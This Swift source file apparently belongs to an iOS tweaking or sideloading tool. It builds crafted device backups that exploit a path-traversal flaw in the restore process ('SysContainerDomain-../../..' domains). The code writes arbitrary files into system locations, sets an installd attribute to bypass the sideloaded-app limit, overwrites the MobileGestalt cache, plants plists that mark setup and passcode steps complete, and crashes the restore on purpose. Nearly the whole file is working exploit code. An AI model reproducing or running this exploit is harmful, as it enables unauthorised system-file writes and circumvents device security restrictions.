import Foundation

enum PathTraversalCapability: Int {
    case unsupported = 0 // 18.2b3+, 17.7.2
    case dotOnly // 18.1b5-18.2b2, 17.7.1
    case dotAndSlashes // up to 18.1b4, 17.7
}

class FileToRestore {
    var contents: Data
    var to: URL
    var owner, group: Int32
    
    init(from: URL, to: URL, owner: Int32 = 0, group: Int32 = 0) {
        self.contents = try! Data(contentsOf: from)
        self.to = to
        self.owner = owner
        self.group = group
    }
    
    init(contents: Data, to: URL, owner: Int32 = 0, group: Int32 = 0) {
        self.contents = contents
        self.to = to
        self.owner = owner
        self.group = group
    }
}

struct Restore {
    static func supportedExploitLevel() -> PathTraversalCapability {
        if #available(iOS 18.1, *) {
            return .dotOnly
        } else {
            return .dotAndSlashes
        }
    }
    
    static func createBypassAppLimit() -> Backup {
        let deviceList = MobileDevice.deviceList()
        guard deviceList.count == 1 else {
            print("Invalid device count: \(deviceList.count)")
            return Backup(files: [])
        }
        let udid = deviceList.first!
        let apps = MobileDevice.listApplications(udid: udid)
        
        var files = [BackupFile]()
        for (bundleID, value) in apps! {
            guard !bundleID.isEmpty,
                  let value = value.value as? [String: AnyCodable],
                  let bundlePath = value["Path"]?.value as? String,
                  // Find all apps containing mobileprovision
                  // while this is not 100% accurate, it ensures this is applied to all sideloaded apps
                  access(bundlePath.appending("/embedded.mobileprovision"), F_OK) == 0
            else { continue }
            print("Found \(bundleID): \(bundlePath)")
            files.append(Directory(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(bundlePath.hasPrefix("/private/") ? String(bundlePath.dropFirst(8)) : bundlePath)",
                owner: 33,
                group: 33,
                // set it 3 bytes because 4 bytes causes "EA was not set to expected value"
                // it looks like the value is ignored if actual size is smaller than expected
                xattrs: ["com.apple.installd.validatedByFreeProfile": "\u{0}\u{0}\u{0}"]
            ))
        }
        
        files.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
        return Backup(files: files)
    }
    
    static func createMobileGestalt(file: FileToRestore) -> Backup {
        let cloudConfigPlist: [String : Any] = [
            "SkipSetup": ["WiFi", "Location", "Restore", "SIMSetup", "Android", "AppleID", "IntendedUser", "TOS", "Siri", "ScreenTime", "Diagnostics", "SoftwareUpdate", "Passcode", "Biometric", "Payment", "Zoom", "DisplayTone", "MessagingActivationUsingPhoneNumber", "HomeButtonSensitivity", "CloudStorage", "ScreenSaver", "TapToSetup", "Keyboard", "PreferredLanguage", "SpokenLanguage", "WatchMigration", "OnBoarding", "TVProviderSignIn", "TVHomeScreenSync", "Privacy", "TVRoom", "iMessageAndFaceTime", "AppStore", "Safety", "Multitasking", "ActionButton", "TermsOfAddress", "AccessibilityAppearance", "Welcome", "Appearance", "RestoreCompleted", "UpdateCompleted"],
            "AllowPairing": true,
            "ConfigurationWasApplied": true,
            "CloudConfigurationUIComplete": true,
            "ConfigurationSource": 0,
            "PostSetupProfileWasInstalled": true,
            "IsSupervised": false,
        ]
        let purplebuddyPlist = [
            "SetupDone": true,
            "SetupFinishedAllSteps": true,
            "UserChoseLanguage": true
        ]
        
        return Backup(files: [
            // MobileGestalt
            Directory(path: "", domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcache"),
            Directory(path: "systemgroup.com.apple.mobilegestaltcache/Library", domain: "SysSharedContainerDomain-"),
            Directory(path: "systemgroup.com.apple.mobilegestaltcache/Library/Caches", domain: "SysSharedContainerDomain-"),
            ConcreteFile(
                path: "systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
                domain: "SysSharedContainerDomain-",
                contents: file.contents,
                owner: file.owner,
                group: file.group),
            //ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data())
            // Skip setup
            Directory(path: "", domain: "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles"),
            Directory(path: "systemgroup.com.apple.configurationprofiles/Library", domain: "SysSharedContainerDomain-"),
            Directory(path: "systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles", domain: "SysSharedContainerDomain-"),
            ConcreteFile(
                path: "systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist",
                domain: "SysSharedContainerDomain-",
                contents: try! PropertyListEncoder().encode(AnyCodable(cloudConfigPlist)),
                owner: 501,
                group: 501),
            ConcreteFile(
                path: "mobile/com.apple.purplebuddy.plist",
                domain: "ManagedPreferencesDomain",
                contents: try! PropertyListEncoder().encode(AnyCodable(purplebuddyPlist)),
                owner: 501,
                group: 501),
        ])
    }
    
    static func createBackupFiles(files: [FileToRestore]) -> Backup {
        // create the files to be backed up
        var filesList : [BackupFile] = [
            Directory(path: "", domain: "RootDomain"),
            Directory(path: "Library", domain: "RootDomain"),
            Directory(path: "Library/Preferences", domain: "RootDomain")
        ]
        
        // create the links
        for (index, file) in files.enumerated() {
            filesList.append(ConcreteFile(
                path: "Library/Preferences/temp\(index)",
                domain: "RootDomain",
                contents: file.contents,
                owner: file.owner,
                group: file.group,
                inode: UInt64(index)))
        }
        
        // add the file paths
        for (index, file) in files.enumerated() {
            let restoreFilePath = file.to.path(percentEncoded: false)
            var basePath = "/var/backup"
            // set it to work in the separate volumes (prevents a bootloop)
            if restoreFilePath.hasPrefix("/var/mobile/") {
                // required on iOS 17.0+ since /var/mobile is on a separate partition
                basePath = "/var/mobile/backup"
            } else if restoreFilePath.hasPrefix("/private/var/mobile/") {
                basePath = "/private/var/mobile/backup"
            } else if restoreFilePath.hasPrefix("/private/var/") {
                basePath = "/private/var/backup"
            }
            filesList.append(Directory(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(basePath)\(file.to.deletingLastPathComponent().path(percentEncoded: false))",
                owner: file.owner,
                group: file.group
            ))
            filesList.append(ConcreteFile(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(basePath)\(file.to.path(percentEncoded: false))",
                contents: Data(),
                owner: file.owner,
                group: file.group,
                inode: UInt64(index)))
        }
        
        // break the hard links
        for (index, _) in files.enumerated() {
            filesList.append(ConcreteFile(
                path: "",
                domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp\(index)",
                contents: Data(),
                owner: 501,
                group: 501))
        }
        
        // crash on purpose
        filesList.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
        
        // create the backup
        return Backup(files: filesList)
    }
}
